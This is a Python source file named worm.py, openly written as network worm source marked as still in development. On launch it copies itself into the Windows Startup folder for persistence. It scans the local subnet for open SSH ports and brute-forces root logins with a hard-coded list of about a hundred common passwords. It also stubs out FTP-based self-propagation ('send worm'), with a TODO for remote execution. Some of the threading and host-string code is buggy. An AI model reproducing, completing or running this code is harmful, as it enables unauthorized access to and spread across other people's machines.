####################################
# File name: worm.py               #
# Author: Filip Komárek   (pylyf)  #
# Status: Development              #
# Date created: 7/6/2018           #
####################################
import ftplib
import os
import queue
import re
import socket
import threading
from ftplib import FTP
from shutil import copy2

import coloredlogs
import logging
import paramiko

# ----- -----
# ----- -----


def scan(target, port):
    sock = socket.socket()
    sock.settimeout(1/5)
    r = sock.connect_ex((target, port))
    sock.close()
    if r == 0:
        return True
    else:
        return False


def scan_hosts(port):
    logger.debug(f"Scanning machines on the same network with port {port} open.")

    logger.debug("Gateway: " + networkID + "1")
    all_hosts = []

    for i in range(255):
        if scan(f"{networkID}{i}", port):
            all_hosts.append(i)

    logger.debug("Hosts: " + str(all_hosts))
    return all_hosts


def download_ssh_passwords():
    return ['guest', '123456', 'password', '12345', 'a1b2c3', '123456789', 'Password1', '1234', 'abc123', '12345678',
            'qwerty', 'baseball', 'football', 'unknown', 'soccer', 'jordan23', 'iloveyou', 'monkey', 'shadow',
            'g_czechout', '1234567', '1q2w3e4r', '111111', 'f**kyou', 'princess', 'basketball', 'sunshine', 'jordan',
            'michael', '1234567890', 'reset', 'zinch', 'maiden', '123123', '81729373759', 'superman', 'hunter',
            'anthony', 'maggie', 'super123', 'purple', 'love', 'ashley', 'andrew', 'justin', 'killer', 'pepper',
            'tigger', 'buster', 'nicole', 'taylor', '123', 'matthew', 'babygirl', 'michelle', 'cookie', 'jessica',
            'datpiff', 'charlie', 'jasmine', 'peanut', 'abcd1234', 'cheese', 'brandon', 'hannah', 'pokemon', 'family',
            'ginger', '1qaz2wsx', 'hello', 'computer', 'joshua', 'money', 'letmein', 'yankees', 'bailey', 'hockey',
            'batman', 'diamond', 'madison', 'michael1', 'amanda', 'thomas', 'passw0rd', 'harley', 'jennifer', 'music',
            'daniel', 'samantha', 'mustang', 'freedom', 'robert', 'whatever', 'summer', 'asdfghjkl', 'football1',
            'brooklyn', '654321', 'william', 'trustno1']


def connect_to_ssh(host, password):
    """
    Tries to connect to a SSH server
    Returns:
        True - Connection successful
        False - Something went wrong
    Args:
        host - Target machine's IP
        password - Password to use
    """

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        logger.debug("Connecting to: " + host)
        client.connect(host, 22, "root", password)
        logger.debug(f"Successfully connected! with {password} on {host} using root")

        try:
            ftp = FTP(host)
            ftp.connect(host, 22)
            ftp.login("root", password)

            print("send worm")

        except ftplib.all_errors as error:
            logger.error(error)
            pass

        # TODO: download and run worm on remote
        return True
    except socket.error:
        logger.error("Computer is offline or port 22 is closed")
        return False
    except paramiko.ssh_exception.AuthenticationException:
        logger.error("Wrong Password or Username")
        return False
    except paramiko.ssh_exception.SSHException:
        # socket is open, but not SSH service responded
        logger.error("No response from SSH server")
        return False


def controller(que):
    while que.qsize() > 0:
        bruteforce_ssh(f"{networkID, que.get_nowait()}", passes)


def bruteforce_ssh(host, wordlist):
    for passw in wordlist:
        connect_to_ssh(host, passw)


logger = logging.getLogger(__name__)
coloredlogs.install(fmt='%(message)s', level='DEBUG', logger=logger)
# --------------------------------------------------- #

# This function makes the worm copy itself into the startup folder of windows devices
copy2(__file__, os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
# gets gateway of the network
myIP = socket.gethostbyname(socket.gethostname())
networkID = re.search("^(\\d*\\.\\d*\\.\\d*\\.)", myIP).group()

active = scan_hosts(22)
passes = download_ssh_passwords()

t = []
q = queue.Queue()

for i in active:
    q.put_nowait(i)

for i in range(10):
    t.append(threading.Thread(target=controller(q)))

for thred in t:
    thred.start()

for thred in t:
    thred.join()
